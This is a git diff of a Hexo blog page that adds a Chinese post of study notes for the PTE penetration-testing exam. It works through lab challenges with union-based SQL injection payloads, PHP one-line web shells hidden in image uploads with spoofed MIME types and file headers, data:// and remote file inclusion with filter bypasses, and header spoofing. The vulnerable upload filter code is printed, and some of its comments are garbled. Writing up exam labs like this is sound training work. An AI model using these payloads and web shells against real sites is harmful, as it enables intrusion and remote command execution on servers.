@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | Hexo</title>
+  <title>pte刷题笔记 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/page/10/index.html">
+  <meta name="description" content="总结：要记住的东西：sql：    group_concat()    information_schema    columns    information_schema.columns底下的列名：table_schema,table_name,column_name文件上传：    一句话木马： &lt;?php eval($_POST[&#39;a&#39;]);?&gt;,变型 &lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pte刷题笔记">
+<meta property="og:url" content="http://example.com/2022/03/14/pte%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="总结：要记住的东西：sql：    group_concat()    information_schema    columns    information_schema.columns底下的列名：table_schema,table_name,column_name文件上传：    一句话木马： &lt;?php eval($_POST[&#39;a&#39;]);?&gt;,变型 &lt;">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-13T16:19:42.000Z">
+<meta property="article:modified_time" content="2022-03-13T16:20:13.601Z">
 <meta property="article:author" content="ouroborosscr">
 <meta name="twitter:card" content="summary">
   
@@ -162,328 +166,352 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-pte刷题笔记" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pte刷题笔记
+    </h1>
+  
+
+        
+        
+
+	<span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+		  <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+
+
+<a href="/2022/03/14/pte%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-03-13T16:19:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-14</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>总结：要记住的东西：<br>sql：<br>    group_concat()<br>    information_schema<br>    columns<br>    information_schema.columns底下的列名：table_schema,table_name,column_name<br>文件上传：<br>    一句话木马：<code> &lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code>,变型<code> &lt;?php echo @system($_POST[&#39;a&#39;]);?&gt;</code><br>    研究自带的sqzr.php（之前考试都可以传)<br>    可能会检查文件内容的头，可以复制（也可以copy /b jpg.jpg+sqzr.php result.jpg<br>反序列化：<br>    尽量找能shell的题目，背下基础的构成以防万一（因为操作机环境没有php)<br>文件包含：<br>    伪协议（data，远程文件包含）<br>    双写绕过别忘了<br>referer和xff：<br>    X-Forwarded-For（拼写）</p>
+<p>周末抽时间刷了一下pte的基础题，确实挺基础的（说实话比学之前招生老师扔给我的例子简单多了）<br>一共五道题<br>1.sql注入<br>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from Article where uuid &#x3D; &#39;983fd952-df4e-4b63-946f-f2e6bb0327d6&#39;</span><br><span class="line">&#x2F;&#x2F;simple check</span><br><span class="line"></span><br><span class="line">while(strstr($uuid,&#39;--&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    $uuid &#x3D; str_replace(&#39;--&#39;,&#39;&#39;,$uuid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(strstr($uuid,&#39;#&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    $uuid &#x3D; str_replace(&#39;#&#39;,&#39;&#39;,$uuid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>url是<code>http://10.1.11.12:34071/start/index.php?uuid=983fd952-df4e-4b63-946f-f2e6bb0327d6</code></p>
+<p>过滤了<code>--</code>和<code>#</code>，老师的做法是就不用注释了，但是这里还有<code>;%00</code>可以用</p>
+<p>1.<code>;%00</code>法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,2,3,4,5,6;%00&#96;&#96;&#96;:发现回显是2和3</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns;%00&#96;&#96;&#96;和&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns;%00&#96;&#96;&#96;拿到所有库名表名列名</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,haha,3,4,5,6 from IS_KEY;%00&#96;&#96;&#96;拿到key</span><br><span class="line"></span><br><span class="line">2.不注释（用单引号闭合后面）</span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;983fd952-df4e-4b63-946f-f2e6bb0327d6 &#39; union select 1,2,3,4,5,&#39;6&#96;&#96;&#96;只有6的时候可以，所以是六个参</span><br><span class="line"></span><br><span class="line">其余几乎一样</span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,2,3,4,5,&#39;6&#96;&#96;&#96;:发现回显是2和3</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns where &#39;1&#39;&#x3D;&#39;1&#96;&#96;&#96;和&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,group_concat(table_schema),group_concat(column_name),4,5,6 from information_schema.columns where &#39;1&#39;&#x3D;&#39;1&#96;&#96;&#96;拿到所有库名表名列名</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;uuid&#x3D;-1 &#39; union select 1,haha,3,4,5,6 from IS_KEY where &#39;1&#39;&#x3D;&#39;1 &#96;&#96;&#96;拿到key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件上传：</span><br><span class="line">因为能shell，所以直接拿了代码：</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+ <?php error_reporting(0); ?>
+<?php include("function.php"); ?>
+<html>
+<head>
+  <title></title>
+  <link rel="stylesheet" href="../css/bootstrap.css">
+  <link rel="stylesheet" href="../css/nav.css">
+  <meta charset="UTF-8">
+</head>
+
+<body>
+
+  <?php include '../header.php';?>
+
+  <div class="container mt-5 min-height main-body">
+
+
+<div class="row">
+   <div class="col-7 m-auto">
+            <div class="card-content white-text">
+              <?php
+
+<pre><code>          $files = @$_FILES[&quot;files&quot;];
+          
+          if (judge($files)) 
+&#123;
+              $fullpath = &#39;/&#39; . $files[&quot;name&quot;];
+              if (move_uploaded_file($files[&#39;tmp_name&#39;], $_SERVER[&quot;DOCUMENT_ROOT&quot;] . $fullpath)) &#123;
+                  echo &quot;&lt;a href=&#39;$fullpath&#39;&gt;图片上传成功&lt;/a&gt;&quot;;
+              &#125;
+          &#125;
+          elseif (!(judge($files))&amp;&amp;!empty($files)) &#123;
+$fullpath = &#39;&#39;;
+            echo &quot;图片上传失败！&quot;;
+          &#125;
+          
+
+          echo &#39;&lt;form method=POST enctype=&quot;multipart/form-data&quot; action=&quot;&quot;&gt;
+                  &lt;input type=&quot;file&quot; name=&quot;files&quot;&gt;
+                  &lt;input type=submit value=&quot;上传&quot; class=&quot;btn btn-warning&quot;&gt;&lt;/form&gt;&#39;;
+
+          ?&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;card-action&quot;&gt;
+          &lt;?php if($fullpath!= &#39;&#39;) &#123; echo &quot;文件有效，上传成功： &lt;a href=\&quot;$fullpath\&quot;&gt; 点我查看&lt;/a&gt;&quot;; &#125; ?&gt;
+        &lt;/div&gt;
+</code></pre>
+  </div>
+  </div>
+
+
+</div>
+<?php include '../footer.php';?>
+</body>
+</html>
+</html>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<?php
+    
+    //é»‘åå•éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡
+    function step1($files)
+    {
+        $filename = $files["name"];
+        $ext = substr($filename,strripos($filename,'.') + 1);
+        if ($ext != "php")
+        {
+            return true;
+        }
+        return false;
+    }
+
+<pre><code>//éªŒè¯MIMEå¤´ï¼Œä¿®æ”¹æ•°æ®åŒ…ç»•è¿‡
+function step2($files)
+&#123;
+
+    if($files[&#39;type&#39;] == &quot;image/gif&quot; || $files[&#39;type&#39;] == &quot;image/jpeg&quot; || $files[&#39;type&#39;] == &quot;image/png&quot; ) 
+    &#123;
+        return true;
+    &#125;
+    return false;
+&#125;
+
+//éªŒè¯æ–‡ä»¶å†…å®¹ï¼Œä¸èƒ½åŒ…å«evalç­‰æ•æ„Ÿå‡½æ•°åï¼Œä½¿ç”¨å…¶ä»–å†…å®¹ï¼Œæ–‡ä»¶è¯»å†™
+function step3($files)
+&#123;
+    $content = file_get_contents($files[&quot;tmp_name&quot;]);
+
+    if (strpos($content, &quot;eval&quot;) === false &amp;&amp; strpos($content, &quot;assert&quot;) === false )
+    &#123;
+        return true;
+    &#125;
+    return false;
+&#125;
+
+
+//éªŒè¯æ–‡ä»¶å¤´
+function step4($files)
+&#123;
+    $png_header = &quot;89504e47&quot;;
+    $jpg_header = &quot;ffd8FFE0&quot;;
+    $gif_header = &quot;47494638&quot;;
+
+    $header = bin2hex(file_get_contents ( $files[&quot;tmp_name&quot;] , 0 , NULL , 0 , 4 )); 
+
+    if (strcasecmp($header,$png_header) == 0 || strcasecmp($header,$jpg_header) == 0 || strcasecmp($header,$gif_header) == 0) 
+    &#123;
+        return true;
+    &#125;
+    return false;
+&#125;
+
+function judge($files)
+&#123;
+
+    if (step2($files) &amp;&amp; step3($files) &amp;&amp; step4($files))
+    &#123;
+        return true;
+    &#125;
+    return false;
+    
+&#125;
+</code></pre>
+<p>?&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以看见验证了step2，step3，step4</span><br><span class="line">分别对应这type（可伪造），内部函数是否有eval（可以用echo system()替代），还检测了png，jpg，gif的文件头（也可以伪造）</span><br><span class="line"></span><br><span class="line">所以先传一个正经图片，然后加上一句话木马&#96;&#96;&#96;  &lt;?php echo @system($_POST[&#39;a&#39;]);?&gt;&#96;&#96;&#96;即可</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反序列化：</span><br><span class="line">源码：</span><br></pre></td></tr></table></figure>
+<?php
+error_reporting(0);
+include "key4.php";
+$TEMP = "Whatever is worth doing is worth doing well.";
+$str = $_GET['str'];
+if (unserialize($str) === $TEMP)
+{
+    echo "$key4";
+}
+show_source(__FILE__);
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">非常简单的一道题，但唯一的问题是：考试的操作机环境没有php</span><br><span class="line">解决方法是利用上面的文件上传shell之后，写入代码（echo &quot;……&quot; &gt;&gt; 1.php）</span><br></pre></td></tr></table></figure>
+<?php
+$TEMP = "Whatever is worth doing is worth doing well.";
+echo serialize($TEMP);
+```
+```s:44:"Whatever is worth doing is worth doing well.";```
+
+
+文件包含：
+page=hello时，显示的是hello.txt的内容，提示在key.php里，所以要用伪协议（要复习）
+page=data://text/plan,<?php phpinfo();?>
+<p>发现data被过滤了<br>所以双写page=dadata://ta://text/plan,<?php phpinfo();?></p>
+<p>方法二：远程文件包含<br>监听随意端口：<br>python -m SimpleHTTPServer 8899</p>
+<p>然后访问自己的计算机的8899端口：复制一下本地桌面上木马的链接地址（木马的后缀为txt）<br>然后page=http://本地ip:8899/文件名（去掉.txt）</p>
+<p>referer和xff，cookie<br>签到题，唯一的问题是xff的拼写：X-Forwarded-For<br>然后傻乎乎的用题目的ip，用127.0.0.1，localhost，0.0.0.0</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/14/pte%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
+    </div>
+</div>
 
-<a href="/2021/05/11/WICCTF2021-%E6%B4%A5%E9%97%A8%E6%9D%AF-web-power-cut/" class="archive-article-date">
-  	<time datetime="2021-05-11T12:47:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/11/WICCTF2021-%E6%B4%A5%E9%97%A8%E6%9D%AF-web-power-cut/">WICCTF2021(津门杯)web_power_cut</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+<nav id="article-nav">
+  
+    <a href="/2022/03/14/spring%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          spring笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/02/27/MyBatis%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">MyBatis笔记</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
-<a href="/2021/05/11/WICCTF2021-%E6%B4%A5%E9%97%A8%E6%9D%AF-web-hate-php/" class="archive-article-date">
-  	<time datetime="2021-05-11T12:40:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-11</time>
-</a>
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/11/WICCTF2021-%E6%B4%A5%E9%97%A8%E6%9D%AF-web-hate-php/">WICCTF2021(津门杯)web_hate_php</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+        
+        
+    </div>
+</aside>
 
 
-<a href="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" class="archive-article-date">
-  	<time datetime="2021-05-11T11:44:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/05/11/dirsearch%E8%B8%A9%E5%9D%91%E4%BB%A5%E5%8F%8Apython-%E5%87%BA%E7%8E%B0%E2%80%9CTraceback-most-recent-call-last-%E2%80%A6%E2%80%A6%E2%80%9D%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">dirsearch踩坑以及python 出现“Traceback (most recent call last):……”错误的解决方法</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web8/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:51:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web8/">bugku_web_web8</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web7/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:15:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web7/">bugku_web_web7</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web6/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:00:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web6/">bugku_web_web6</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web5/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:30:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web5/">bugku_web_web5</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web4/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:19:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web4/">bugku_web_web4</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web3/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:05:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web3/">bugku_web_web3</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web2/" class="archive-article-date">
-  	<time datetime="2021-04-26T10:52:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web2/">bugku_web_web2</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/9/">&amp;laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/8/">8</a><a class="page-number" href="/archives/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/archives/page/11/">11</a><a class="page-number" href="/archives/page/12/">12</a><a class="extend next" rel="next" href="/archives/page/11/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
           </div>
         </div>
       </div>
@@ -516,8 +544,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
